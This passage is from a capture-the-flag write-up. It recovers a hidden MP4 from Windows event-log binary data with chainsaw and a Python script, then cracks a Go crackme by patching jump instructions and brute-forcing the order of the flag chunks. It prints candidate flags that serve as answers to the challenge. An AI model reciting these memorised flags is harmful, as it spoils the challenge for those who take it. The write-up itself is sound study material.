Or, if you're working on a non-Windows OS, you can utilize things like Python `evtx` library or `chainsaw`. I opted for the latter: first converting the `Application.evtx` into JSON:

```bash
chainsaw dump Application.evtx --json -o Application.json
```

Then, I created a Python script to replicate the filtering logic of the PowerShell script:

```python
import json
import base64

with open("Application.json") as f:
    data = json.load(f)

chunks = [None] * 65000
eventIds = [i for i in range(40000, 65000)]


for event in data:
    name = event['Event']['System']['Provider_attributes']['Name']
    eventId = event['Event']['System']['EventID']
    recordId = event['Event']['System']['EventRecordID']
    
    # Filter based on the PowerShell deobfuscated
    if name != 'Mslnstaller': continue
    if eventId not in eventIds: continue
    
    # Get the data
    binary = event['Event']['EventData']['Binary']
    if binary == None: continue
    chunks[recordId] = binary

# Get rid of None values
chunks = [x for x in chunks if x is not None]
with open('flag.mp4', 'wb') as f:
    f.write(bytes.fromhex(''.join(chunks)))
```

Running this script will iterate through the events and if it's a valid event (source and EventID match), it will place the binary data in the chunk based on RecordID. Then, we just clear unused chunks and write the file to `flag.mp4`!

```bash
python3 solve.py
file flag.mp4
flag.mp4: ISO Media, MP4 Base Media v1 [ISO 14496-12:2003]
```

# GoCrackMe3

I didn't keep good documentation of this one. It was more trial and error until something worked. Despite not being a good writeup, I'm including it because there were only ~100 solves after 20 days. It was basically a lot of patching. For example, `0x004f7a76 JZ` to `JNZ` would give the 'Access still denied' message. Then at `4f7fcd` you could patch to get 'Actually, I don't feel like printing the flag...' 

![[Pasted image 20241031160953.png]]

I kept repeating the patching of the logic (basically just invert everything) and changing some of the `JMP` branches, and eventually you can get to `004f81a4` which generates chunks of the flag in memory. By default, it only does 3 chunks: `221fccaa8`, `flag{32b2`, `42024a30b` and you need to patch the for loop to get the last chunk: `edda76fdc2`.

![[Pasted image 20241031161034.png]]

I cheesed this pretty hard since it was out of order, but I just generated all permutations and tried each one.

```
flag{221fccaa832b242024a30bedda76fdc2}
flag{221fccaa832b2edda76fdc242024a30b}
flag{221fccaa842024a30b32b2edda76fdc2}
flag{221fccaa842024a30bedda76fdc232b2}
flag{221fccaa8edda76fdc232b242024a30b}
flag{221fccaa8edda76fdc242024a30b32b2}
flag{32b2221fccaa842024a30bedda76fdc2}
flag{32b2221fccaa8edda76fdc242024a30b}
flag{32b242024a30b221fccaa8edda76fdc2}
flag{32b242024a30bedda76fdc2221fccaa8}
flag{32b2edda76fdc2221fccaa842024a30b}
flag{32b2edda76fdc242024a30b221fccaa8}
flag{42024a30b221fccaa832b2edda76fdc2}
flag{42024a30b221fccaa8edda76fdc232b2}
flag{42024a30b32b2221fccaa8edda76fdc2}
flag{42024a30b32b2edda76fdc2221fccaa8}
flag{42024a30bedda76fdc2221fccaa832b2}
flag{42024a30bedda76fdc232b2221fccaa8}
flag{edda76fdc2221fccaa832b242024a30b}
flag{edda76fdc2221fccaa842024a30b32b2}
flag{edda76fdc232b2221fccaa842024a30b}
flag{edda76fdc232b242024a30b221fccaa8}
flag{edda76fdc242024a30b221fccaa832b2}
flag{edda76fdc242024a30b32b2221fccaa8}
```

I got the correct flag on my third attempt. Also, using https://github.com/getCUJO/ThreatIntel for Ghidra helps with the process a lot. You can also use this [PR](https://github.com/getCUJO/ThreatIntel/pull/4) by https://github.com/monoidic which adds golang 1.20 support. 

